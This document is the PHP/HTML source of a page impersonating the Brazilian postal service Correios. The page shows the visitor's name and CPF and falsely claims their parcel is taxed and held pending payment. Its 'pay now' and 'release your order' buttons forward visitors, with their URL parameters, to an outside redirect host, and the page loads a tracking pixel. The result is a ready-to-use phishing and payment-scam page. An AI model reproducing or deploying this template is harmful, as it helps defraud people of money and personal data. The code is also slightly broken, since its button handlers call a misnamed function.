<?php
session_start();
$nome = isset($_SESSION['nome']) ? $_SESSION['nome'] : '';
$cpf = isset($_SESSION['cpf']) ? $_SESSION['cpf'] : '';
$_SESSION['data_atual'] = date("d/m/Y", strtotime("+1 day"));
?>

<html lang="pt-BR">

<head>
    <title>🟢 RASTREANDO</title>
    <meta name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, shrink-to-fit=no">
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <link rel="icon" href="images/qt80YQ8lK60n.ico">
    <link rel="apple-touch-icon" href="images/qt80YQ8lK60n.ico">
    <meta name="description" content="">
    <meta name="keywords" content="">
    <meta name="robots" content="all">
    <meta property="og:locale" content="pt_BR">
    <meta property="og:type" content="article">
    <meta property="og:title" content="">
    <meta property="og:description" content="">
    <meta property="og:site_name" content="">
    <meta property="og:url" content="https://www.oficial-correios.site/rastreio/oficial">
    <link rel="stylesheet" href="css/1Rrdh5seNC1c.css">
    <link rel="dns-prefetch preconnect" href="https://pages.greatpages.com.br/" crossorigin="">
    <link rel="dns-prefetch preconnect" href="https://fonts.googleapis.com" crossorigin="">
    <link rel="dns-prefetch preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link rel="dns-prefetch preconnect" href="https://www.greatpages.com.br" crossorigin="">
    <style type="text/css" id="operaUserStyle"></style>
    <link
        href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,400;0,700;1,400;1,700&family=Open+Sans:ital,wght@0,400;0,700;1,400;1,700&display=swap"
        rel="stylesheet" media="all">
</head>

<body class="">
    <div id="site" tyle="white-space: normal;">
        <div id="b_1225979_1_1736606248678282284c60c" class="gpc-b" style="white-space: normal;">
            <div class="gpc-b_sobreposicao"></div>
        </div>
        <div id="b_1225979_1_1736606248678282284c5df" class="gpc-b " style="white-space: normal;">
            <div class="gpc-b_sobreposicao"></div>
            <div class="centralizar">
                <div id="e_1225979_1_57686_m" class="gpc-e e_imagem dm e_1225979_1_57686">
                    <div class="c imagem e_imagem">
                        <div class="imagem_fundo"></div>
                    </div>
                </div>
                <div id="e_1225979_1_60477_m" class="gpc-e e_texto dm dm e_1225979_1_60477"
                    style="white-space: normal;">
                    <div class="c e_texto" style="white-space: normal;">
                        <p><span><br></span></p>
                        <p><span><br><?php echo isset($_SESSION['nome']) ? htmlspecialchars($_SESSION['nome']) : 'Nome não disponível'; ?></span></p>
                    </div>
                </div>
                <div id="e_1225979_1_51231_m" class="gpc-e e_texto dm dm e_1225979_1_51231"
                    style="white-space: normal;">
                    <div class="c e_texto" style="white-space: normal;">
                        <br>
                        <br>
                        <p style="white-space: normal;"><span><b>ENCOMENDA TRIBUTADA</b></span></p>
                    </div>
                </div>
                <div id="e_1225979_1_75116_m" class="gpc-e e_texto dm dm e_1225979_1_75116"
                    style="white-space: normal;">
                    <div class="c e_texto" style="white-space: normal;">
                        <p><span><br><br></span></p>
                        <?php echo isset($_SESSION['cpf']) ? htmlspecialchars($_SESSION['cpf']) : 'CPF não disponível'; ?>
                    </div>
                </div>
                <div id="e_1225979_1_83162_m" class="gpc-e e_texto dm dm e_1225979_1_83162"
                    style="white-space: normal;">
                    <div class="c e_texto" style="white-space: normal;">
                        <p><b> Sua encomenda foi TRIBUTADA</b></p>
                        <p><b><br></b></p>
                    </div>
                </div>
                <div id="e_1225979_1_24573_m" class="gpc-e e_texto dm dm e_1225979_1_24573"
                    style="white-space: normal;">
                    <div class="c e_texto" style="white-space: normal;">
                        <p><span>Status da entrega: <b>Aguardando Pagamento</b></span></p>
                    </div>
                </div>
                <div id="e_1225979_1_10156_m" class="gpc-e e_texto dm dm e_1225979_1_10156"
                    style="white-space: normal;">
                    <div class="c e_texto" style="white-space: normal;">
                        <p><span><b>Sua encomenda está retida na agência dos correios em Cutiriba - PR</b></span></p>
                    </div>
                </div>
                <div id="e_1225979_1_16907_m" class="gpc-e e_imagem dm e_1225979_1_16907" style="white-space: normal;">
                    <div class="c imagem e_imagem" style="white-space: normal;">
                        <div class="imagem_fundo"></div>
                    </div>
                </div>
                <div id="e_1225979_1_23145_m" class="gpc-e e_titulo dm dm e_1225979_1_23145"
                    style="white-space: normal;">
                    <div class="c e_titulo" style="white-space: normal;">
                        <h1><span>Receber até dia <b>11/03/2025</b><b> </b>após o pagamento</span></h1>
                    </div>
                </div>
                <div id="e_1225979_1_34836_m" class="gpc-e e_titulo dm dm e_1225979_1_34836">
                    <div class="c e_titulo" style="white-space: normal;">
                        <h2><b><a onclick="redirecxt(event)"
                                    class="link_externo" id="c3641828-69dd-515d-aa72-725a4ec5112c">Efetuar
                                    Pagamento</a></b></h2>
                    </div>
                </div>
                <div id="e_1225979_1_65553" class="gpc-e e_texto dd dm e_1225979_1_65553" style="white-space: normal;">
                    <div class="c e_texto" style="white-space: normal;">
                        <p><span>Nome Completo:</span></p>
                        <p><span><b><?php echo isset($_SESSION['nome']) ? htmlspecialchars($_SESSION['nome']) : 'Nome não disponível'; ?><br><br></b>CPF:<b> <?php echo isset($_SESSION['cpf']) ? htmlspecialchars($_SESSION['cpf']) : 'CPF não disponível'; ?><br><br></b>Prazo para
                                regularização:<b>
                                <p><span><?php echo isset($_SESSION['data_atual']) ? htmlspecialchars($_SESSION['data_atual']) : 'Data Indisponível'; ?></span></p>
</b></span></p>
                    </div>
                </div>
                <br><br>
                <div id="e_1225979_1_28606" class="gpc-e e_botao dd dm e_1225979_1_28606" style="white-space: normal;">
                    <br>
                    <a class="c borda_igual e_botao link_externo"
                        onclick="redirecxt(event)"
                        id="695630e3-6473-1ac3-8204-ddee1fec1ad1" style="white-space: normal;">CLIQUE AQUI PARA LIBERAR
                        SEU PEDIDO</a>
                </div>
                <div id="e_1225979_1_53338" class="gpc-e e_imagem dd dm e_1225979_1_53338" style="white-space: normal;">
                    <div cla="" ss="c imagem e_imagem" style="white-space: normal;">
                        <div class="imagem_fundo"></div>
                    </div>
                </div>
                <div id="e_1225979_1_173671440078955287" class="gpc-e e_caixa dd dm e_1225979_1_173671440078955287"
                    style="white-space: normal;">
                    <div class="c borda_igual e_caixa"></div>
                </div>
                <div id="e_1225979_1_72799" class="gpc-e e_titulo dd dm e_1225979_1_72799" style="white-space: normal;">
                    <div class="c e_titulo" style="white-space: normal;">
                        <h2><span>Portal Correios </span><span>> </span><span>Rastreamento </span><span>>
                            </span><span>Alfândega</span></h2>
                    </div>
                </div>
            </div>
        </div>
        <div id="b_1225979_1_1736606248678282284c603" class="gpc-b">
            <div class="gpc-b_sobreposicao"></div>
            <div class="centralizar">
                <div id="e_1225979_1_57686_d"
                    ll_src="https://cdn.greatsoftwares.com.br/arquivos/paginas_editor/15850-b8129ec4c63a313a704841b1ec612268.png"
                    ll_src_mobile="https://cdn.greatsoftwares.com.br/arquivos/paginas_editor/15850-b8129ec4c63a313a704841b1ec612268.png"
                    class="gpc-e e_imagem dd e_1225979_1_57686 se_imagem">
                    <div class="c imagem e_imagem"></div>
                </div>
                <div id="e_1225979_1_60477_d" class="gpc-e e_texto dd e_1225979_1_60477">
                    <div class="c e_texto" style="white-space: normal;">
                        <p><span><br></span></p>
                        <p><span><br></span></p>
                    </div>
                </div>
                <div id="e_1225979_1_51231_d" class="gpc-e e_texto dd e_1225979_1_51231" style="white-space: normal;">
                    <div class="c e_texto" style="white-space: normal;">
                        <p><span><b>ENCOMENDA TRIBUTADA</b></span></p>
                    </div>
                </div>
                <div id="e_1225979_1_75116_d" class="gpc-e e_texto dd e_1225979_1_75116">
                    <div class="c e_texto" style="white-space: normal;">
                        <p><span>Não informado<br></span></p>
                    </div>
                </div>
                <div id="e_1225979_1_83162_d" class="gpc-e e_texto dd e_1225979_1_83162" style="white-space: normal;">
                    <div class="c e_texto" style="white-space: normal;">
                        <p><b>Não Sua encomenda foi TRIBUTADA</b></p>
                        <p><b><br></b></p>
                    </div>
                </div>
                <div id="e_1225979_1_24573_d" class="gpc-e e_texto dd e_1225979_1_24573" style="white-space: normal;">
                    <div class="c e_texto" style="white-space: normal;">
                        <p><span>Status da entrega: <b>Aguardando Pagamento</b></span></p>
                    </div>
                </div>
                <div id="e_1225979_1_10156_d" class="gpc-e e_texto dd e_1225979_1_10156" style="white-space: normal;">
                    <div class="c e_texto" style="white-space: normal;">
                        <p><span><b>Sua encomenda está retida na agência dos correios em Cutiriba - PR</b></span></p>
                    </div>
                </div>
                <div id="e_1225979_1_16907_d"
                    ll_src="https://cdn.greatsoftwares.com.br/arquivos/paginas_editor/15850-3aeaa092368e52344c66b50a36527aa0.png"
                    ll_src_mobile="https://cdn.greatsoftwares.com.br/arquivos/paginas_editor/15850-3aeaa092368e52344c66b50a36527aa0.png"
                    class="gpc-e e_imagem dd e_1225979_1_16907 se_imagem">
                    <div class="c imagem e_imagem"></div>
                </div>
                <div id="e_1225979_1_23145_d" class="gpc-e e_titulo dd e_1225979_1_23145" style="white-space: normal;">
                    <div class="c e_titulo" style="white-space: normal;">
                        <h1><span>Receber até dia <b>11/03/2025</b><b> </b>após o pagamento</span></h1>
                    </div>
                </div>
                <div id="e_1225979_1_34836_d" class="gpc-e e_titulo dd e_1225979_1_34836" style="white-space: normal;">
                    <div class="c e_titulo" style="white-space: normal;">
                        <h2><b><a onclick="redirecxt(event)"
                                    class="link_externo" id="33ba3c37-86af-eb59-2201-9cde01fc9125">Efetuar
                                    Pagamento</a></b></h2>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <style>
        
        .stuck {
            position: fixed;
            width: 100%;
            top: 0;
            z-index: 999999;
        }
    </style>
    <script>
        function redirect(event) {
            event.preventDefault();
            var currentUrlParams = window.location.search;
            window.location.href = "https://go.disruptybr.click/fr9q3kaev2" + currentUrlParams;
        }
    </script>
    <script>
        window.pixelId = "67b55e4dab32c3b13a0c40d2";
        var a = document.createElement("script");
        a.setAttribute("async", "");
        a.setAttribute("defer", "");
        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
        document.head.appendChild(a);
    </script>
    <script src="js/6kkom3fQNbTi.js" data-utmify-prevent-subids="" async="" defer=""></script>


</body>

</html>